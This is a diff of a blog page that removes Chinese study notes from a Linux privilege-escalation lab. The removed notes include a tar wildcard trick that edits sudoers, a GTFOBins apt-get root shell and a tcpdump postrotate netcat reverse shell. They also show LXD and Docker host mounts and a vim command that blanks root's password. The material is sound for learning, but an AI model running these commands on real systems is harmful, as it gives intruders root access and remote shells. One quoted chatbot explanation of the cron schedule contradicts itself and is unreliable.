@@ -234,7 +234,7 @@
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ffa2c4>
+            <a href="/tags/base" style=color:#03a9f4>
                 base
             </a>
         </span>
@@ -270,558 +270,8 @@
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <h1 id="Path-Abuse"><a href="#Path-Abuse" class="headerlink" title="Path Abuse"></a>Path Abuse</h1><p>如果我们可以修改用户的路径，我们可以用恶意脚本（如反向shell）替换常见的二进制文件（如ls）。如果我们加上。通过发出命令path&#x3D;.：$PATH，然后导出PATH，我们将能够通过键入文件名来运行位于当前工作目录中的二进制文件（即，仅键入ls将调用当前工作目录下名为ls的恶意脚本，而不是位于&#x2F;bin&#x2F;ls的二进制文件）。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ PATH=.:$&#123;PATH&#125;
-htb_student@NIX02:~$ export PATH
-htb_student@NIX02:~$ echo $PATH
-
-.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-</code></pre>
-<p>在本例中，我们修改路径，以便在键入ls命令时运行一个简单的echo命令。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ touch ls
-htb_student@NIX02:~$ echo &#39;echo &quot;PATH ABUSE!!&quot;&#39; &gt; ls
-htb_student@NIX02:~$ chmod +x ls
-</code></pre>
-<pre><code class="shell-session">htb_student@NIX02:~$ ls
-
-PATH ABUSE!!
-</code></pre>
-<h1 id="Wildcard-Abuse"><a href="#Wildcard-Abuse" class="headerlink" title="Wildcard Abuse"></a>Wildcard Abuse</h1><p>滥用通配符</p>
-<p>通配符可以用作其他字符的替换，并在执行其他操作之前由shell进行解释。通配符的示例包括：</p>
-<table>
-<thead>
-<tr>
-<th><strong>字符</strong></th>
-<th><strong>意义</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>*</code></td>
-<td>可以匹配文件名中任意数量的字符的星号。</td>
-</tr>
-<tr>
-<td><code>?</code></td>
-<td>匹配单个字符。</td>
-</tr>
-<tr>
-<td><code>[ ]</code></td>
-<td>方括号将字符括起来，并且可以匹配定义位置的任何一个字符。</td>
-</tr>
-<tr>
-<td><code>~</code></td>
-<td>开头的波浪号扩展为用户主目录的名称，也可以附加另一个用户名以引用该用户的主目录。</td>
-</tr>
-<tr>
-<td><code>-</code></td>
-<td>括号内的连字符表示字符范围。</td>
-</tr>
-</tbody></table>
-<p>tar命令是一个如何滥用通配符进行权限提升的示例，它是一个用于创建&#x2F;提取归档的通用程序。如果我们查看tar命令的手册页，我们会看到以下内容：</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ man tar
-
-&lt;SNIP&gt;
-Informative output
-       --checkpoint[=N]
-              Display progress messages every Nth record (default 10).
-
-       --checkpoint-action=ACTION
-              Run ACTION on each checkpoint.
-</code></pre>
-<p>–checkpoint操作选项允许在到达检查点时执行EXEC操作（即，在执行tar命令后运行任意操作系统命令。）通过使用这些名称创建文件，当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh将作为命令行选项传递给tar。让我们在实践中看到这一点。 考虑下面的cron作业，它被设置为备份&#x2F;root目录的内容，并在&#x2F;tmp中创建一个压缩的归档文件。cron作业被设置为每分钟运行一次，因此它是特权提升的一个很好的候选者。</p>
-<blockquote>
-<p>&#x3D;&#x3D;当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh&#x3D;&#x3D;这句话相当于手动设置ACTION为sh root.sh</p>
-</blockquote>
-<pre><code class="shell-session">#
-#
-mh dom mon dow command
-*/01 * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *
-</code></pre>
-<p>这里补充一些chatgpt：</p>
-<blockquote>
-<p>这个命令看起来像是一个 cron 表达式，用于设置定时任务。在 cron 表达式中，有 5 个字段，它们分别表示：</p>
-<ol>
-<li><code>m</code>：分钟（0-59）</li>
-<li><code>h</code>：小时（0-23）</li>
-<li><code>dom</code>：月份中的某一天（1-31）</li>
-<li><code>mon</code>：月份（1-12）</li>
-<li><code>dow</code>：星期中的某一天（0-7，其中 0 和 7 都表示星期日）</li>
-</ol>
-<p>每个字段可以是一个具体的数字，也可以是一个范围或者一个列表。例如，<code>*</code> 表示匹配所有的可能值。你提供的表达式缺少了具体的数字或通配符，所以不能确定这个表达式的具体含义。</p>
-<p>在一个完整的 cron 表达式中，你需要为每个字段提供具体的值或通配符，以指定定时任务的执行时间。例如，以下是一个有效的 cron 表达式：</p>
-<pre><code>* * * * * command
-</code></pre>
-<p>这个表达式表示每分钟都执行 <code>command</code> 命令。在实际使用 cron 表达式时，请确保为每个字段提供适当的值，以确保定时任务能够按照你的预期进行执行。</p>
-</blockquote>
-<blockquote>
-<p>这个 cron 表达式表示一个定时任务，它将在每小时的第一分钟（即每小时的 0 分钟）执行一次。该任务的具体命令如下：</p>
-<pre><code class="bash">cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *
-</code></pre>
-<p>这个命令执行了两个操作：</p>
-<ol>
-<li><code>cd /root</code>：切换当前工作目录到 <code>/root</code> 目录。</li>
-<li><code>tar -zcf /tmp/backup.tar.gz *</code>：将当前目录中的所有文件和子目录（除了隐藏文件）打包为一个名为 <code>backup.tar.gz</code> 的压缩文件，并保存到 <code>/tmp</code> 目录下。</li>
-</ol>
-<p>在定时任务中使用 <code>*/01</code> 作为分钟字段的值，表示该任务将每小时的每分钟都执行一次。由于 <code>*/01</code> 和 <code>*</code> 效果是相同的，因此也可以简写为 <code>*</code>，这样定时任务的表达式将是 <code>* * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code>。</p>
-<p>总结：这个定时任务将在每小时的第一分钟执行，并将 <code>/root</code> 目录中的所有文件和子目录打包为一个压缩文件保存到 <code>/tmp</code> 目录中。</p>
-</blockquote>
-<p>考虑到以上内容，我们可以利用cron作业中的通配符将必要的命令写成文件名。当cron作业运行时，这些文件名将被解释为参数，并执行我们指定的任何命令。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ echo &#39;echo &quot;cliff.moore ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; root.sh
-htb_student@NIX02:~$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh root.sh&quot;
-htb_student@NIX02:~$ echo &quot;&quot; &gt; --checkpoint=1
-</code></pre>
-<blockquote>
-<p>当解析 <code>cliff.moore ALL=(root) NOPASSWD: ALL</code> 这段代码时，我们可以将其分解为以下几个部分：</p>
-<ol>
-<li><p><code>cliff.moore</code>: 这是允许执行 <code>sudo</code> 命令的用户名。换句话说，用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令获得特权执行权限。</p>
-</li>
-<li><p><code>ALL</code>: 这是指用户 <code>cliff.moore</code> 可以在系统中执行任意的命令，即可以在任何位置和任何情况下使用 <code>sudo</code> 命令。</p>
-</li>
-<li><p><code>(root)</code>: 这表示用户 <code>cliff.moore</code> 可以使用 <code>sudo</code> 命令以 root 用户的身份执行命令。在括号中指定了用户 <code>cliff.moore</code> 可以使用的目标用户，这里是 <code>root</code>，即以 root 用户身份执行命令。</p>
-</li>
-<li><p><code>NOPASSWD: ALL</code>: 这表示用户 <code>cliff.moore</code> 在执行 <code>sudo</code> 命令时不需要输入密码，即可以无需验证密码地以 root 用户的身份执行任意命令。</p>
-</li>
-</ol>
-<p>综上所述，该代码的含义是：用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令以 root 用户的身份在系统中执行任意命令，并且在执行 <code>sudo</code> 命令时无需输入密码。这样，用户 <code>cliff.moore</code> 就可以在需要管理员权限的任务上更加便捷地工作，但同时也增加了系统的安全风险。因此，需要谨慎对待对 <code>sudoers</code> 文件的修改，确保只授予必要的权限并只给予可信用户访问权限。</p>
-</blockquote>
-<p>我们可以检查并查看是否创建了必要的文件。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ ls -la
-
-total 56
-drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
-drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
--rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
--rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1
--rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
-drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
-drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
--rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh
-</code></pre>
-<p>一旦cron作业再次运行，我们就可以检查新添加的sudo权限和直接root的sudo。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ sudo -l
-
-Matching Defaults entries for cliff.moore on NIX02:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User cliff.moore may run the following commands on NIX02:
-    (root) NOPASSWD: ALL
-</code></pre>
-<h1 id="Escaping-Restricted-Shells"><a href="#Escaping-Restricted-Shells" class="headerlink" title="Escaping Restricted Shells"></a>Escaping Restricted Shells</h1><p>可以使用几种方法来从受限制的shell中逃脱。其中一些方法涉及利用外壳本身的漏洞，而另一些方法则涉及使用创造性技术来绕过外壳施加的限制。以下是一些可以用于从受限shell中转义的方法示例。</p>
-<h4 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h4><p>想象我们在一个受限的shell中，它允许我们通过将命令作为参数传递给ls命令来执行命令。不幸的是，shell只允许我们使用一组特定的参数来执行ls命令，例如ls-l或ls-a，但它不允许我们执行任何其他命令。在这种情况下，我们可以通过向ls命令的参数中注入额外的命令，使用命令注入来从shell中转义。 例如，我们可以使用以下命令将pwd命令注入ls命令的参数中：</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ ls -l `pwd` 
-</code></pre>
-<blockquote>
-<p><code>pwd</code>：这个部分使用反引号 &#96;&#96;&#96; 将 <code>pwd</code> 命令包围起来。这被称为命令替换（Command Substitution）。它的作用是将 <code>pwd</code> 命令的输出结果（即当前工作目录的路径）插入到整个命令中。</p>
-<p>$ ls -l `pwd`<br>total 32<br>-rw-r–r– 1 user user 1024 Jul 16 10:30 file1.txt<br>-rw-r–r– 1 user user 2048 Jul 16 10:31 file2.txt<br>drwxr-xr-x 2 user user 4096 Jul 16 10:32 directory1<br>drwxr-xr-x 2 user user 4096 Jul 16 10:33 directory2<br>…</p>
-</blockquote>
-<h4 id="Command-Substitution"><a href="#Command-Substitution" class="headerlink" title="Command Substitution"></a>Command Substitution</h4><p>另一种从受限shell中转义的方法是使用命令替换。这涉及到使用shell的命令替换语法来执行命令。例如，假设shell允许用户通过将命令封装在backticks（&#96;）中来执行命令。在这种情况下，可以通过在不受shell限制的backtick替换中执行命令来从shell中转义。</p>
-<h4 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h4><p>为了从受限制的shell中转义以使用环境变量，需要修改或创建shell用于执行不受shell限制的命令的环境变量。例如，如果shell使用环境变量来指定执行命令的目录，则可以通过修改环境变量的值以指定不同的目录来从shell中转义。</p>
-<h4 id="Shell-Functions"><a href="#Shell-Functions" class="headerlink" title="Shell Functions"></a>Shell Functions</h4><p>在某些情况下，可以通过使用shell函数来逃离受限制的shell。为此，我们可以定义和调用执行不受shell限制的命令的shell函数。比方说，shell允许用户定义和调用shell函数，可以通过定义执行命令的shell函数来逃离shell。</p>
-<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.</p>
-<h1 id="Special-Permissions"><a href="#Special-Permissions" class="headerlink" title="Special Permissions"></a>Special Permissions</h1><p>执行时设置用户ID（setuid）权限可以允许用户使用另一个用户的权限（通常具有提升的权限）执行程序或脚本。setuid位显示为s。</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null
-</code></pre>
-<blockquote>
-<p>在 Linux 文件系统中，文件和目录的权限由 10 个字符表示，其中第一个字符表示文件类型，后面的 9 个字符表示文件的访问权限。在这 9 个字符中，前三个字符表示文件所有者（Owner）的权限，接着的三个字符表示文件所属组（Group）的权限，最后三个字符表示其他用户的权限。</p>
-<p>数字 <code>4000</code> 表示 <code>setuid</code> 权限位。它是 <code>s</code> 权限位的数值表示。<code>s</code> 权限位可以设置在文件的所有者的执行权限位上，以允许文件在执行时获取所有者的权限。</p>
-<p>在权限字符串中，<code>4000</code> 的表示如下：</p>
-<pre><code>-rwsr-xr-x
-</code></pre>
-<p>其中：</p>
-<ul>
-<li><code>-</code> 表示文件类型为普通文件。</li>
-<li><code>rws</code> 表示设置了 <code>setuid</code> 权限位。实际上，这里的 <code>s</code> 是 <code>x</code> 权限位（执行权限）的替代符，表示设置了 <code>setuid</code>。</li>
-<li><code>r-x</code> 表示文件所有者具有读取和执行权限。</li>
-<li><code>r-x</code> 表示文件所属组和其他用户具有读取和执行权限。</li>
-</ul>
-<p>总结：<code>-rwsr-xr-x</code> 权限位表示此文件是一个普通文件，具有 <code>setuid</code> 权限，所有者拥有读取、写入和执行权限，而组成员和其他用户拥有读取和执行权限。</p>
-<p>在系统中，<code>setuid</code> 权限通常用于一些需要特权身份运行的程序，如 <code>/usr/bin/passwd</code>，以便在更改用户密码时获得必要的权限。但是，<code>setuid</code> 权限需要谨慎使用，因为错误地设置它可能导致系统安全风险。</p>
-</blockquote>
-<p>可能会对设置了SETUID位的程序进行反向工程，识别漏洞，并利用此漏洞提升我们的权限。许多程序都有可以用来执行命令的附加功能，如果在这些程序上设置了setuid位，这些功能就可以用于我们的目的。 Set Group ID（setgid）权限是另一种特殊权限，它允许我们运行二进制文件，就好像我们是创建二进制文件的组的一部分一样。可以使用以下命令枚举这些文件：find&#x2F;-uid 0-perm-6000-type f 2&gt;&#x2F;dev&#x2F;null。可以以与setuid二进制文件相同的方式利用这些文件来提升权限。</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null
-
--rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-</code></pre>
-<h2 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h2><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>项目是一个精心策划的二进制文件和脚本列表，攻击者可以使用这些文件和脚本来绕过安全限制。每个页面都详细介绍了程序的功能，这些功能可用于突破受限制的shell、提升权限、生成反向shell连接和传输文件。例如，apt-get可以用于突破受限环境，并通过添加预调用命令生成shell：</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-
-# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-<h1 id="Sudo-Rights-Abuse"><a href="#Sudo-Rights-Abuse" class="headerlink" title="Sudo Rights Abuse"></a>Sudo Rights Abuse</h1><p>Sudo权限可以授予一个帐户，允许该帐户在根（或另一个帐户）的上下文中运行某些命令，而不必更改用户或授予过多的权限。当发出sudo命令时，系统将检查发出命令的用户是否具有&#x2F;etc&#x2F;sudoers中配置的适当权限。当登录系统时，我们应该始终通过键入sudo-l来检查当前用户是否具有任何sudo权限。有时，我们需要知道用户的密码才能列出他们的sudo权限，但任何带有NOPASSWD选项的权限条目都可以在不输入密码的情况下看到。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ sudo -l
-
-Matching Defaults entries for sysadm on NIX02:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User sysadm may run the following commands on NIX02:
-    (root) NOPASSWD: /usr/sbin/tcpdump
-</code></pre>
-<p>这很容易被误解。例如，用户可以在不需要密码的情况下被授予根级别权限。或者，允许的命令行可能指定得太松散，使我们能够以意外的方式运行程序，从而导致权限提升。例如，如果编辑sudoers文件以授予用户根据sudoers中的以下条目运行命令（如tcpdump）的权限：（ALL）NOPASSWD:&#x2F;usr&#x2F;sbin&#x2F;tcpdump，则攻击者可以利用此权限来利用postrotate命令选项。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ man tcpdump
-
-&lt;SNIP&gt; 
--z postrorate-command              
-
-Used in conjunction with the -C or -G options, this will make `tcpdump` run &quot; postrotate-command file &quot; where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
-</code></pre>
-<p>通过指定-z标志，攻击者可以使用tcpdump执行shell脚本、获得作为根用户的反向shell或运行其他特权命令。例如，攻击者可以创建包含反向shell的shell脚本.test，并按如下方式执行：</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
-</code></pre>
-<blockquote>
-<p>这个命令使用 <code>tcpdump</code> 工具进行网络数据包捕获，并利用 <code>-z</code> 选项指定了一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。以下是命令的各个选项的解释：</p>
-<ul>
-<li><code>sudo</code>: 使用超级用户权限运行 <code>tcpdump</code>，因为只有特权用户（如 <code>root</code>）才能进行网络数据包捕获。</li>
-<li><code>tcpdump</code>: 命令本身，用于捕获和显示网络数据包。</li>
-<li><code>-ln</code>: 以数字格式显示输出，并禁用 DNS 反向解析。</li>
-<li><code>-i eth0</code>: 指定网络接口为 <code>eth0</code>，即指定从 <code>eth0</code> 网络接口捕获数据包。</li>
-<li><code>-w /dev/null</code>: 将捕获的数据包写入 <code>/dev/null</code>，即丢弃数据包而不实际保存。</li>
-<li><code>-W 1</code>: 指定数据包文件的最大数量为 1，即每次最多只生成一个数据包文件。</li>
-<li><code>-G 1</code>: 指定生成新数据包文件的时间间隔为 1 秒。</li>
-<li><code>-z /tmp/.test</code>: 指定一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。在每个新文件创建时，将运行该脚本，对新文件进行处理。</li>
-<li><code>-Z root</code>: 在 <code>tcpdump</code> 运行时设置当前用户为 <code>root</code>，这通常用于确保在捕获数据包时具有足够的权限。</li>
-</ul>
-</blockquote>
-<p>让我们试试这个。首先，制作一个文件，用postrotate命令执行，添加一个简单的反向shell一行。</p>
-<pre><code class="shell-session">htb_student@NIX02:~$ cat /tmp/.test
-
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 443 &gt;/tmp/f
-</code></pre>
-<blockquote>
-<p>这个命令使用了一系列 Linux 命令，下面逐步解释：</p>
-<ol>
-<li><code>rm /tmp/f</code>：删除 <code>/tmp/f</code> 文件，确保之前不存在同名的命名管道（named pipe）。</li>
-<li><code>mkfifo /tmp/f</code>：创建一个命名管道 <code>/tmp/f</code>。命名管道是一种特殊类型的文件，可以用于进程间通信，它允许一个进程将数据写入管道，而另一个进程可以从管道读取数据。</li>
-<li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1</code>：将 <code>/tmp/f</code> 命名管道的输出通过管道（<code>|</code>）传递给 <code>/bin/sh</code>，并使用 <code>-i</code> 选项开启一个交互式 Shell。<code>2&gt;&amp;1</code> 将标准错误输出重定向到标准输出，确保错误信息也被传递到 <code>/bin/sh</code>。</li>
-<li><code>nc 10.10.14.3 443 &gt; /tmp/f</code>：将 <code>/bin/sh</code> 的输出通过网络连接传递给 IP 地址为 <code>10.10.14.3</code>，端口号为 <code>443</code> 的远程主机。同时，将从网络连接接收到的数据写入 <code>/tmp/f</code> 命名管道。</li>
-</ol>
-</blockquote>
-<h1 id="Privileged-Groups"><a href="#Privileged-Groups" class="headerlink" title="Privileged Groups"></a>Privileged Groups</h1><h2 id="LXC-x2F-LXD"><a href="#LXC-x2F-LXD" class="headerlink" title="LXC &#x2F; LXD"></a>LXC &#x2F; LXD</h2><p>LXD类似于Docker，是Ubuntu的容器管理器。安装后，所有用户都会添加到LXD组中。通过创建一个LXD容器，使其具有特权，然后访问&#x2F;mnt&#x2F;root上的主机文件系统，可以使用该组的成员身份来提升权限。让我们确认组成员身份，并使用这些权限升级为root用户。</p>
-<pre><code class="shell-session">devops@NIX02:~$ id
-
-uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
-</code></pre>
-<p>Unzip the Alpine image.</p>
-<pre><code class="shell-session">devops@NIX02:~$ unzip alpine.zip 
-
-Archive:  alpine.zip
-extracting: 64-bit Alpine/alpine.tar.gz  
-inflating: 64-bit Alpine/alpine.tar.gz.root  
-cd 64-bit\ Alpine/
-</code></pre>
-<p>启动LXD初始化过程。为每个提示选择默认值。有关每一步的更多信息，请参阅本文<a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04">post</a> 。</p>
-<pre><code class="shell-session">devops@NIX02:~$ lxd init
-</code></pre>
-<p>Import the local image.</p>
-<pre><code class="shell-session">devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
-</code></pre>
-<p>启动一个安全性设置为true的特权容器，以在没有UID映射的情况下运行容器，使容器中的根用户与主机上的根用户相同。</p>
-<pre><code class="shell-session">devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
-</code></pre>
-<p>装载主机文件系统。</p>
-<pre><code class="shell-session">devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
-
-Device mydev added to r00t
-</code></pre>
-<p>最后，在容器实例中生成一个shell。我们现在可以以root用户身份浏览已装载的主机文件系统。例如，要访问主机上根目录的内容，请键入cd&#x2F;mnt&#x2F;root&#x2F;root。从这里，我们可以读取&#x2F;etc&#x2F;shadow等敏感文件，并获得密码哈希或访问SSH密钥，以便以root身份连接到主机系统，等等。</p>
-<pre><code class="shell-session">devops@NIX02:~$ lxc start r00t
-devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
-
-~ # id
-uid=0(root) gid=0(root)
-~ # 
-</code></pre>
-<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>将用户放在docker组中本质上相当于在不需要密码的情况下对文件系统进行根级访问。docker组的成员可以生成新的docker容器。一个例子是运行命令docker run-v&#x2F;root:&#x2F;mnt-it ubuntu。此命令创建一个新的Docker实例，其中主机文件系统上的&#x2F;root目录作为卷安装。一旦容器启动，我们就可以浏览到已安装的目录，并为根用户检索或添加SSH密钥。这可以对其他目录（如&#x2F;etc&#x2F;shadow文件）执行，这些目录可用于检索&#x2F;etc&#x2F;shadow文件的内容以进行脱机密码破解或添加特权用户。</p>
-<h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>磁盘组中的用户可以完全访问&#x2F;dev&#x2F;sda1中包含的任何设备，例如&#x2F;dev&#x2F;sda1，它通常是操作系统使用的主要设备。具有这些权限的攻击者可以使用debugfs以根级别权限访问整个文件系统。与Docker组示例一样，这可以用于检索SSH密钥、凭据或添加用户。</p>
-<h2 id="ADM"><a href="#ADM" class="headerlink" title="ADM"></a>ADM</h2><p>adm组的成员可以读取&#x2F;var&#x2F;log中存储的所有日志。这不会直接授予root访问权限，但可以用来收集存储在日志文件中的敏感数据，或枚举用户操作和运行cron作业。</p>
-<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p> <strong>Use the privileged group rights of the secaudit user to locate a flag.</strong></p>
-<h1 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h1><p>设置功能包括使用适当的工具和命令为可执行文件或程序分配特定的功能。例如，在Ubuntu中，我们可以使用setcap命令为特定的可执行文件设置功能。此命令允许我们指定要设置的功能和要分配的值。 例如，我们可以使用以下命令为可执行文件设置cap_net_bind_service功能：</p>
-<h4 id="Set-Capability"><a href="#Set-Capability" class="headerlink" title="Set Capability"></a>Set Capability</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
-</code></pre>
-<p>当为二进制文件设置了功能时，这意味着二进制文件将能够执行特定的操作，而如果没有这些功能，它将无法执行这些操作。例如，如果为二进制文件设置了cap_net_bind_service功能，则该二进制文件将能够绑定到网络端口，这是一种通常受到限制的特权。 某些功能，如cap_sys_admin，允许可执行文件以管理权限执行操作，如果使用不当，可能会造成危险。例如，我们可以利用它们来提升其权限、获取对敏感信息的访问权限或执行未经授权的操作。因此，为适当的沙盒和隔离的可执行文件设置这些类型的功能并避免不必要地授予它们是至关重要的。</p>
-<table>
-<thead>
-<tr>
-<th><strong>能力</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>cap_sys_admin</code></td>
-<td>允许使用管理权限执行操作，例如修改系统文件或更改系统设置。</td>
-</tr>
-<tr>
-<td><code>cap_sys_chroot</code></td>
-<td>允许更改当前进程的根目录，允许它访问原本无法访问的文件和目录。</td>
-</tr>
-<tr>
-<td><code>cap_sys_ptrace</code></td>
-<td>允许附加到和调试其他进程，可能允许它访问敏感信息或修改其他进程的行为。</td>
-</tr>
-<tr>
-<td><code>cap_sys_nice</code></td>
-<td>允许提高或降低进程的优先级，从而可能允许它访问原本会受到限制的资源。</td>
-</tr>
-<tr>
-<td><code>cap_sys_time</code></td>
-<td>允许修改系统时钟，可能允许它操纵时间戳或导致其他进程以意外方式运行。</td>
-</tr>
-<tr>
-<td><code>cap_sys_resource</code></td>
-<td>允许修改系统资源限制，例如打开文件描述符的最大数量或可以分配的最大内存量。</td>
-</tr>
-<tr>
-<td><code>cap_sys_module</code></td>
-<td>允许加载和卸载内核模块，可能允许它修改操作系统的行为或访问敏感信息。</td>
-</tr>
-<tr>
-<td><code>cap_net_bind_service</code></td>
-<td>允许绑定到网络端口，可能允许它访问敏感信息或执行未经授权的操作。</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th><strong>能力值</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>=</code></td>
-<td>此值为可执行文件设置指定的功能，但不授予任何权限。如果我们想清除可执行文件先前设置的功能，这会很有用。</td>
-</tr>
-<tr>
-<td><code>+ep</code></td>
-<td>此值向可执行文件授予指定功能的有效和允许的权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。</td>
-</tr>
-<tr>
-<td><code>+ei</code></td>
-<td>此值为可执行文件的指定功能授予足够的可继承权限。这允许可执行文件执行该功能允许的操作，以及可执行文件生成的子进程继承功能并执行相同的操作。</td>
-</tr>
-<tr>
-<td><code>+p</code></td>
-<td>此值向可执行文件授予指定功能的允许权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。如果我们想要向可执行文件授予功能，但阻止它继承该功能或允许子进程继承它，这可能很有用。</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th><strong>能力</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>CAP_SETUID</code></td>
-<td>允许进程设置其有效用户 ID，该 ID 可用于获取其他用户（包括该用户）的特权。<code>root</code></td>
-</tr>
-<tr>
-<td><code>CAP_SETGID</code></td>
-<td>允许设置其有效组 ID，可用于获取另一个组（包括该组）的权限。<code>root</code></td>
-</tr>
-<tr>
-<td><code>CAP_SYS_ADMIN</code></td>
-<td>此功能提供了广泛的管理权限，包括能够执行为用户保留的许多操作，例如修改系统设置以及挂载和卸载文件系统。<code>root</code></td>
-</tr>
-</tbody></table>
-<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>如果我们使用低权限帐户访问了系统，但没有cap_sys_admin功能：</p>
-<h4 id="Exploiting-Capabilities"><a href="#Exploiting-Capabilities" class="headerlink" title="Exploiting Capabilities"></a>Exploiting Capabilities</h4><pre><code class="shell-session">Tanin@htb[/htb]$ getcap /usr/bin/vim.basic
-
-/usr/bin/vim.basic cap_dac_override=eip
-</code></pre>
-<p>例如，&#x2F;usr&#x2F;bin&#x2F;vim.basic二进制文件在没有特殊权限的情况下运行，例如使用sudo。然而，由于二进制文件具有cap_sys_admin功能集，因此它可以提升运行它的用户的权限。这将允许渗透测试人员获得cap_sys_admin功能并执行需要此功能的任务。 让我们看看&#x2F;etc&#x2F;passwd文件，其中指定了用户root：</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/passwd | head -n1
-
-root:x:0:0:root:/root:/bin/bash
-</code></pre>
-<p>我们可以使用&#x2F;usr&#x2F;bin&#x2F;vim二进制文件的cap_sys_admin功能来修改系统文件：</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
-</code></pre>
-<p>我们还可以在非交互式模式下进行这些更改：</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ echo -e &#39;:%s/^root:[^:]*:/root::/\nwq&#39; | /usr/bin/vim.basic -es /etc/passwd
-Tanin@htb[/htb]$ cat /etc/passwd | head -n1
-</code></pre>
-<blockquote>
-<p><code>vim -es</code> 是用于以批处理（非交互式）模式运行 Vim 编辑器的命令。在这个模式下，Vim 将在不显示图形用户界面（GUI）的情况下运行，并执行指定的编辑操作或脚本，然后退出。这种模式通常用于自动化编辑任务、批量处理文本文件或在脚本中使用 Vim。</p>
-<p>解释一下命令中的选项：</p>
-<ul>
-<li><p><code>vim</code>：是 Vim 编辑器的命令。</p>
-</li>
-<li><pre><code>-es
-</code></pre>
